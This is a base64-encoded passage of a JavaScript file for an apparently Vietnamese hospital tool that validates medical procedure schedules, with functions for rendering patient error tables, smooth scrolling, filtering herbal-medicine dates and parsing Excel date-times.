CAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXIgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFTDqm4gQk48L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTOG7l2k8L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PiA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICAgICAgPHRkIGNvbHNwYW49IjUiIGNsYXNzPSJlcnJvci1kZXRhaWwiPktow7RuZyBjw7MgbOG7l2kgbsOgbyDEkcaw4bujYyBnaGkgbmjhuq1uPC90ZD48L3RyPjwvdGJvZHk+PC90YWJsZT5gOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgbGV0IGh0bWwgPSBgDQogICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgIDx0aCBjbGFzcz0iZG9jdG9yLWNvbHVtbiI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTOG7l2k8L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQovLy8vLy8vL0LhuqNuZyBs4buNYy8vLy8vLy8vLy8vDQogICAgZmlsdGVyZWRFcnJvcnMuZm9yRWFjaChlcnJvciA9PiB7DQogICAgICAgIGlmIChlcnJvci5kZXRhaWxzKSB7DQogICAgICAgICAgICBodG1sICs9IGANCiAgICAgICAgICAgIDx0ciBjbGFzcz0iZXJyb3Itcm93Ij4NCiAgICAgICAgICAgICAgICA8dGQ+JHtlcnJvci5kZXRhaWxzLnBhdGllbnROYW1lIHx8ICdLaMO0bmcgY8OzJ30gWzxmb250IGNvbG9yPSJyZWQiPiR7ZXJyb3IuZGV0YWlscy5wYXRpZW50QWdlIHx8ICcwMCd9PC9mb250Pl08YnIvPiAke2Vycm9yLmRldGFpbHMucGF0aWVudElkIHx8ICcwMDAwMDAnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7ZXJyb3IuZGV0YWlscy5wcm9jZWR1cmUgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQoJCQkJPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIj4ke2Vycm9yLmRldGFpbHMuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMub3BlcmF0b3IgPyBlcnJvci5kZXRhaWxzLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpIDogJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtlcnJvci5kZXRhaWxzLm5nYXlUaHVjSGllbiB8fCAoZXJyb3IuZGV0YWlscy5kYXRlIHx8ICdLaMO0bmcgY8OzJyl9IDxici8+JHsNCiAgICAgICAgICAgICAgICAgICAgZXJyb3IuZGV0YWlscy5zdGFydFRpbWUgPyBgJHtlcnJvci5kZXRhaWxzLnN0YXJ0VGltZX0gLSAke2Vycm9yLmRldGFpbHMuZW5kVGltZX1gIDogJ0tow7RuZyBjw7MnDQogICAgICAgICAgICAgICAgfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJlcnJvci1kZXRhaWwiPg0KICAgICAgICAgICAgICAgICAgICAke2Vycm9yLm1lc3NhZ2V9DQogICAgICAgICAgICAgICAgICAgPGI+PGZvbnQgY29sb3I9InJlZCI+JHtlcnJvci5kZXRhaWxzLmV4cGVjdGVkID8gYCR7ZXJyb3IuZGV0YWlscy5hY3R1YWx9IHBow7p0PC9mb250PjwvYj4gKFThu5FpIHRoaeG7g3U6ICR7ZXJyb3IuZGV0YWlscy5leHBlY3RlZH0gcGjDunQpYCA6ICcnfQ0KICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICA8L3RyPmA7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBodG1sICs9IGANCiAgICAgICAgICAgIDx0ciBjbGFzcz0iZXJyb3Itcm93Ij4NCiAgICAgICAgICAgICAgICA8dGQgY29sc3Bhbj0iNSIgY2xhc3M9ImVycm9yLWRldGFpbCI+DQogICAgICAgICAgICAgICAgICAgICR7ZXJyb3IubWVzc2FnZX0gJHtlcnJvci5yb3cgPyAnKETDsm5nICcgKyBlcnJvci5yb3cgKyAnKScgOiAnJ30NCiAgICAgICAgICAgICAgICA8L3RkPg0KICAgICAgICAgICAgPC90cj5gOw0KICAgICAgICB9DQogICAgfSk7DQoNCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgICBlcnJvckxvZ0Rpdi5pbm5lckhUTUwgPSBodG1sOw0KfQ0KDQoNCg0KICAgICAgICBmdW5jdGlvbiBsb2dFcnJvcihtZXNzYWdlLCByb3cgPSBudWxsLCBkZXRhaWxzID0gbnVsbCkgew0KICAgICAgICAgICAgZXJyb3JMb2cucHVzaCh7DQogICAgICAgICAgICAgICAgbWVzc2FnZSwNCiAgICAgICAgICAgICAgICByb3csDQogICAgICAgICAgICAgICAgZGV0YWlscywNCiAgICAgICAgICAgICAgICB0aW1lc3RhbXA6IG5ldyBEYXRlKCkudG9Mb2NhbGVUaW1lU3RyaW5nKCksDQogICAgICAgICAgICAgICAgdXNlcjogY3VycmVudFVzZXINCiAgICAgICAgICAgIH0pOw0KICAgICAgICB9DQoNCmZ1bmN0aW9uIGRpc3BsYXlFcnJvcnMoKSB7DQogICAgY29uc3QgZXJyb3JMb2dEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3JMb2cnKTsNCiAgICANCiAgICBpZiAoZXJyb3JMb2cubGVuZ3RoID09PSAwKSB7DQogICAgICAgIGVycm9yTG9nRGl2LmlubmVySFRNTCA9ICc8cD5LaMO0bmcgY8OzIGzhu5dpIG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvcD4nOw0KICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3JTZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgDQogICAgICAgIC8vIE7hur91IGtow7RuZyBjw7MgbOG7l2ksIGN14buZbiB4deG7kW5nIHBo4bqnbiBL4bq/dCBRdeG6oyBLaeG7g20gVHJhDQogICAgICAgIHNldFRpbWVvdXQoKCkgPT4gew0KICAgICAgICAgICAgY29uc3QgcmVzdWx0U2VjdGlvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZXN1bHRTZWN0aW9uJyk7DQogICAgICAgICAgICBpZiAocmVzdWx0U2VjdGlvbiAmJiByZXN1bHRTZWN0aW9uLnN0eWxlLmRpc3BsYXkgIT09ICdub25lJykgew0KICAgICAgICAgICAgICAgIHNtb290aFNjcm9sbFRvKHJlc3VsdFNlY3Rpb24sIC00MCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0sIDMwMCk7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgDQogICAgbGV0IGh0bWwgPSBgDQogICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXByb2NlZHVyZXMgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4bunIHRodeG6rXQ8L3RoPg0KICAgICAgICAgICAgPHRoIGNsYXNzPSJkb2N0b3ItY29sdW1uIj48aSBjbGFzcz0iZmFzIGZhLXVzZXItbWQgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IELDoWMgc+G7uSBjaOG7iSDEkeG7i25oPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXItbnVyc2UgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4budaSBnaWFuPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLWV4Y2xhbWF0aW9uLXRyaWFuZ2xlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBM4buXaTwvdGg+DQogICAgICAgICAgICA8L3RyPg0KICAgICAgICA8L3RoZWFkPg0KICAgICAgICA8dGJvZHk+YDsNCiAgICANCiAgICAvLyBIaeG7g24gdGjhu4sgdOG7q25nIGzhu5dpDQogICAgZXJyb3JMb2cuZm9yRWFjaChlcnJvciA9PiB7DQogICAgICAgIGlmIChlcnJvci5kZXRhaWxzKSB7DQogICAgICAgICAgICBodG1sICs9IGANCiAgICAgICAgICAgIDx0ciBjbGFzcz0iZXJyb3Itcm93Ij4NCiAgICAgICAgICAgICAgICA8dGQ+JHtlcnJvci5kZXRhaWxzLnBhdGllbnROYW1lIHx8ICdLaMO0bmcgY8OzJ30gWzxmb250IGNvbG9yPSJyZWQiPiR7ZXJyb3IuZGV0YWlscy5wYXRpZW50QWdlIHx8ICcwMCd9PC9mb250Pl08YnIvPiAke2Vycm9yLmRldGFpbHMucGF0aWVudElkIHx8ICcwMDAwMDAnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7ZXJyb3IuZGV0YWlscy5wcm9jZWR1cmUgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIj4ke2Vycm9yLmRldGFpbHMuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMub3BlcmF0b3IgPyBlcnJvci5kZXRhaWxzLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpIDogJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtlcnJvci5kZXRhaWxzLm5nYXlUaHVjSGllbiB8fCAoZXJyb3IuZGV0YWlscy5kYXRlIHx8ICdLaMO0bmcgY8OzJyl9IDxici8+JHtlcnJvci5kZXRhaWxzLnN0YXJ0VGltZSA/IGAke2Vycm9yLmRldGFpbHMuc3RhcnRUaW1lfSAtICR7ZXJyb3IuZGV0YWlscy5lbmRUaW1lfWAgOiAnS2jDtG5nIGPDsyd9PC9jZW50ZXI+PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImVycm9yLWRldGFpbCI+DQogICAgICAgICAgICAgICAgICAgICR7ZXJyb3IubWVzc2FnZX0NCiAgICAgICAgICAgICAgICAgICAgPGI+PGZvbnQgY29sb3I9InJlZCI+JHtlcnJvci5kZXRhaWxzLmV4cGVjdGVkID8gYCR7ZXJyb3IuZGV0YWlscy5hY3R1YWx9IHBow7p0PC9mb250PjwvYj4gICAoVOG7kWkgdGhp4buDdTogJHtlcnJvci5kZXRhaWxzLmV4cGVjdGVkfSBwaMO6dClgIDogJyd9DQogICAgICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgICAgIDwvdHI+YDsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGh0bWwgKz0gYA0KICAgICAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgICAgIDx0ZCBjb2xzcGFuPSI2IiBjbGFzcz0iZXJyb3ItZGV0YWlsIj4NCiAgICAgICAgICAgICAgICAgICAgJHtlcnJvci5tZXNzYWdlfSAke2Vycm9yLnJvdyA/ICcoRMOybmcgJyArIGVycm9yLnJvdyArICcpJyA6ICcnfQ0KICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICA8L3RyPmA7DQogICAgICAgIH0NCiAgICB9KTsNCiAgICANCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgICANCiAgICBlcnJvckxvZ0Rpdi5pbm5lckhUTUwgPSBodG1sOw0KICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgIA0KICAgIC8vIEN14buZbiB4deG7kW5nIHBo4bqnbiBs4buXaSBu4bq/dSBjw7MNCiAgICBzZXRUaW1lb3V0KCgpID0+IHsNCiAgICAgICAgY29uc3QgZXJyb3JTZWN0aW9uID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yU2VjdGlvbicpOw0KICAgICAgICBpZiAoZXJyb3JTZWN0aW9uKSB7DQogICAgICAgICAgICBzbW9vdGhTY3JvbGxUbyhlcnJvclNlY3Rpb24sIC0xMzApOw0KICAgICAgICB9DQogICAgfSwgMzAwKTsNCn0NCg0KLy8gSMOgbSBjdeG7mW4gbcaw4bujdCB04buVbmcgcXXDoXQNCmZ1bmN0aW9uIHNtb290aFNjcm9sbFRvKGVsZW1lbnQsIG9mZnNldCA9IDApIHsNCiAgICBlbGVtZW50LmNsYXNzTGlzdC5hZGQoJ2hpZ2hsaWdodC1lcnJvci1zZWN0aW9uJyk7DQogICAgDQogICAgY29uc3QgZWxlbWVudFBvc2l0aW9uID0gZWxlbWVudC5nZXRCb3VuZGluZ0NsaWVudFJlY3QoKS50b3A7DQogICAgY29uc3Qgb2Zmc2V0UG9zaXRpb24gPSBlbGVtZW50UG9zaXRpb24gKyB3aW5kb3cucGFnZVlPZmZzZXQgLSBvZmZzZXQ7DQogICAgDQogICAgY29uc3QgZHVyYXRpb24gPSAxNTAwOw0KICAgIGNvbnN0IHN0YXJ0ID0gd2luZG93LnBhZ2VZT2Zmc2V0Ow0KICAgIGNvbnN0IHN0YXJ0VGltZSA9IHBlcmZvcm1hbmNlLm5vdygpOw0KICAgIA0KICAgIGZ1bmN0aW9uIHNjcm9sbFN0ZXAodGltZXN0YW1wKSB7DQogICAgICAgIGNvbnN0IGVsYXBzZWQgPSB0aW1lc3RhbXAgLSBzdGFydFRpbWU7DQogICAgICAgIGNvbnN0IHByb2dyZXNzID0gTWF0aC5taW4oZWxhcHNlZCAvIGR1cmF0aW9uLCAxKTsNCiAgICAgICAgY29uc3QgZWFzaW5nID0gZWFzZUluT3V0Q3ViaWMocHJvZ3Jlc3MpOw0KICAgICAgICB3aW5kb3cuc2Nyb2xsVG8oMCwgc3RhcnQgKyAob2Zmc2V0UG9zaXRpb24gLSBzdGFydCkgKiBlYXNpbmcpOw0KICAgICAgICANCiAgICAgICAgaWYgKHByb2dyZXNzIDwgMSkgew0KICAgICAgICAgICAgd2luZG93LnJlcXVlc3RBbmltYXRpb25GcmFtZShzY3JvbGxTdGVwKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICANCiAgICBmdW5jdGlvbiBlYXNlSW5PdXRDdWJpYyh0KSB7DQogICAgICAgIHJldHVybiB0IDwgMC41ID8gNCAqIHQgKiB0ICogdCA6IDEgLSBNYXRoLnBvdygtMiAqIHQgKyAyLCAzKSAvIDI7DQogICAgfQ0KICAgIA0KICAgIHdpbmRvdy5yZXF1ZXN0QW5pbWF0aW9uRnJhbWUoc2Nyb2xsU3RlcCk7DQogICAgDQogICAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICAgIGVsZW1lbnQuY2xhc3NMaXN0LnJlbW92ZSgnaGlnaGxpZ2h0LWVycm9yLXNlY3Rpb24nKTsNCiAgICB9LCAyMDAwKTsNCn0NCg0KDQogLy8gPT09PT09IELhuq5UIFPhu7AgS0nhu4ZOIENIRUNLQk9YICJDaOG7iSBoaeG7g24gdGjhu4sgbmfDoHkgc+G6r2MgdGh14buRYyBs4buXaSIgPT09PT09DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd0hlcmJFcnJvckRheXNDaGVja2JveCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uICgpIHsNCiAgICBjb25zdCBzaG93T25seUVycm9yRGF5cyA9IHRoaXMuY2hlY2tlZDsNCg0KICAgIC8vIDEuIEzhuqV5IHRvw6BuIGLhu5kgbmfDoHkgdOG7qyBhbGxQcm9jZWR1cmVzDQogICAgY29uc3QgYWxsRGF0ZXMgPSBbLi4ubmV3IFNldChhbGxQcm9jZWR1cmVzLm1hcChwID0+IHAuZGF0ZSkpXTsNCg0KICAgIC8vIDIuIE7hur91IGLhuq10IGNoZWNrYm94IC0+IGNo4buJIGdp4buvIG5nw6B5IGPDsyBz4bqvYyB0aHXhu5FjIGzhu5dpDQogICAgbGV0IGRhdGVzVG9TaG93ID0gYWxsRGF0ZXM7DQogICAgaWYgKHNob3dPbmx5RXJyb3JEYXlzKSB7DQogICAgICAgIGNvbnN0IGhlcmJEYXRlcyA9IG5ldyBTZXQoKHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcyB8fCBbXSkubWFwKGggPT4gaC5kYXRlKSk7DQogICAgICAgIGRhdGVzVG9TaG93ID0gYWxsRGF0ZXMuZmlsdGVyKGQgPT4gaGVyYkRhdGVzLmhhcyhkKSk7DQogICAgfQ0KDQogICAgLy8gMy4gQ+G6rXAgbmjhuq10IGRyb3Bkb3duIEdp4budIHRy4buRbmcgKGZpbHRlckRhdGUpDQogICAgY29uc3QgZmlsdGVyRGF0ZVNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWx0ZXJEYXRlJyk7DQogICAgaWYgKGZpbHRlckRhdGVTZWxlY3QpIHsNCiAgICAgICAgZmlsdGVyRGF0ZVNlbGVjdC5pbm5lckhUTUwgPSBgPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+YCArDQogICAgICAgICAgICBkYXRlc1RvU2hvdy5tYXAoZCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtkfSI+JHtkfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgIH0NCg0KICAgIC8vIDQuIEPhuq1wIG5o4bqtdCBkcm9wZG93biBT4bqvYyB0aHXhu5FjIHRoYW5nIChoZXJiRGF0ZUZpbHRlcikNCiAgICBjb25zdCBoZXJiRGF0ZVNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiRGF0ZUZpbHRlcicpOw0KICAgIGlmIChoZXJiRGF0ZVNlbGVjdCkgew0KICAgICAgICBoZXJiRGF0ZVNlbGVjdC5pbm5lckhUTUwgPSBgPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+YCArDQogICAgICAgICAgICBkYXRlc1RvU2hvdy5tYXAoZCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtkfSI+JHtkfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgIH0NCn0pOw0KDQoNCiAgICAgICAgZnVuY3Rpb24gcGFyc2VEYXRlVGltZShkYXRldGltZVN0ciwgcm93SW5kZXgpIHsNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgaWYgKCFkYXRldGltZVN0cikgew0KICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIHJldHVybiBudWxsOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAodHlwZW9mIGRhdGV0aW1lU3RyID09PSAnbnVtYmVyJykgew0KICAgICAgICAgICAgICAgICAgICBjb25zdCBleGNlbERhdGUgPSBuZXcgRGF0ZShNYXRoLnJvdW5kKChkYXRldGltZVN0ciAtIDI1NTY5KSAqIDg2NDAwICogMTAwMCkpOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBkYXkgPSBleGNlbERhdGUuZ2V0RGF0ZSgpOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBtb250aCA9IGV4Y2VsRGF0ZS5nZXRNb250aCgpICsgMTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgeWVhciA9IGV4Y2VsRGF0ZS5nZXRGdWxsWWVhcigpOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBob3VycyA9IGV4Y2VsRGF0ZS5nZXRIb3VycygpOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBtaW51dGVzID0gZXhjZWxEYXRlLmdldE1pbnV0ZXMoKTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3Qgc2Vjb25kcyA9IGV4Y2VsRGF0ZS5nZXRTZWNvbmRzKCk7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gew0KICAgICAgICAgICAgICAgICAgICAgICAgZGF0ZU9iajogZXhjZWxEYXRlLA0KICAgICAgICAgICAgICAgICAgICAgICAgZGF0ZUtleTogYCR7ZGF5fS8ke21vbnRofS8ke3llYXJ9YCwNCiAgICAgICAgICAgICAgICAgICAgICAgIG1pbnV0ZXM6IGhvdXJzICogNjAgKyBtaW51dGVzLA0KICAgICAgICAgICAgICAgICAgICAgICAgc2Vjb25kczogaG91cnMgKiAzNjAwICsgbWludXRlcyAqIDYwICsgc2Vjb25kcywNCiAgICAgICAgICAgICAgICAgICAgICAgIGRpc3BsYXlUaW1lOiBgJHtob3Vycy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9OiR7bWludXRlcy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9OiR7c2Vjb25kcy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9YA0KICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKHR5cGVvZiBkYXRldGltZVN0ciA9PT0gJ3N0cmluZycpIHsNCiAgICAgICAgICAgICAgICAgICAgbGV0IGRhdGVQYXJ0LCB0aW1lUGFydCA9ICcwMDowMDowMCc7DQogICAgICAgICAgICAgICAgICAgIGlmIChkYXRldGltZVN0ci5pbmNsdWRlcygnICcpKSBbZGF0ZVBhcnQsIHRpbWVQYXJ0XSA9IGRhdGV0aW1lU3RyLnNwbGl0KCcgJyk7DQogICAgICAgICAgICAgICAgICAgIGVsc2UgZGF0ZVBhcnQgPSBkYXRldGltZVN0cjsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGxldCBkYXksIG1vbnRoLCB5ZWFyOw0KICAgICAgICAgICAgICAgICAgICBpZiAoZGF0ZVBhcnQuaW5jbHVkZXMoJy8nKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgcGFydHMgPSBkYXRlUGFydC5zcGxpdCgnLycpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHBhcnRzLmxlbmd0aCA9PT0gMykgW2RheSwgbW9udGgsIHllYXJdID0gcGFydHMubWFwKE51bWJlcik7DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIGlmIChwYXJ0cy5sZW5ndGggPT09IDIpIFtkYXksIG1vbnRoXSA9IHBhcnRzLm1hcChOdW1iZXIpLCB5ZWFyID0gbmV3IERhdGUoKS5nZXRGdWxsWWVhcigpOw0KICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKGRhdGVQYXJ0LmluY2x1ZGVzKCctJykpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHBhcnRzID0gZGF0ZVBhcnQuc3BsaXQoJy0nKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwYXJ0cy5sZW5ndGggPT09IDMpIFt5ZWFyLCBtb250aCwgZGF5XSA9IHBhcnRzLm1hcChOdW1iZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAocGFydHMubGVuZ3RoID09PSAyKSBbbW9udGgsIGRheV0gPSBwYXJ0cy5tYXAoTnVtYmVyKSwgeWVhciA9IG5ldyBEYXRlKCkuZ2V0RnVsbFllYXIoKTsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHRocm93IG5ldyBFcnJvcignxJDhu4tuaCBk4bqhbmcgbmfDoHkga2jDtG5nIMSRxrDhu6NjIGjhu5cgdHLhu6MnKTsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGlmIChpc05hTihkYXkpIHx8IGlzTmFOKG1vbnRoKSB8fCBpc05hTih5ZWFyKSB8fCBkYXkgPCAxIHx8IGRheSA+IDMxIHx8IG1vbnRoIDwgMSB8fCBtb250aCA+IDEyKSB7DQogICAgICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ0dpw6EgdHLhu4sgbmfDoHkga2jDtG5nIGjhu6NwIGzhu4cnKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgbGV0IGhvdXJzID0gMCwgbWludXRlcyA9IDAsIHNlY29uZHMgPSAwOw0KICAgICAgICAgICAgICAgICAgICBpZiAodGltZVBhcnQuaW5jbHVkZXMoJzonKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgdGltZVBhcnRzID0gdGltZVBhcnQuc3BsaXQoJzonKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGhvdXJzID0gcGFyc2VJbnQodGltZVBhcnRzWzBdKSB8fCAwOw0KICAgICAgICAgICAgICAgICAgICAgICAgbWludXRlcyA9IHBhcnNlSW50KHRpbWVQYXJ0c1sxXSkgfHwgMDsNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlY29uZHMgPSBwYXJzZUludCh0aW1lUGFydHNbMl0pIHx8IDA7DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpc05hTihob3VycykgfHwgaXNOYU4obWludXRlcykgfHwgaXNOYU4oc2Vjb25kcykgfHwgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaG91cnMgPCAwIHx8IGhvdXJzID4gMjMgfHwgbWludXRlcyA8IDAgfHwgbWludXRlcyA+IDU5IHx8IHNlY29uZHMgPCAwIHx8IHNlY29uZHMgPiA1OSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZ0Vycm9yKCdHacOhIHRy4buLIHRo4budaSBnaWFuIGtow7RuZyBo4bujcCBs4buHJywgcm93SW5kZXgsIHsgdGltZTogdGltZVBhcnQgfSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaG91cnMgPSAwOyBtaW51dGVzID0gMDsgc2Vjb25kcyA9IDA7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGNvbnN0IGRhdGVPYmogPSBuZXcgRGF0ZSh5ZWFyLCBtb250aCAtIDEsIGRheSwgaG91cnMsIG1pbnV0ZXMsIHNlY29uZHMpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoaXNOYU4oZGF0ZU9iai5nZXRUaW1lKCkpKSB0aHJvdyBuZXcgRXJyb3IoJ05nw6B5IGtow7RuZyBo4bujcCBs4buHJyk7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBjb25zdCBzZWNvbmRzSW5EYXkgPSB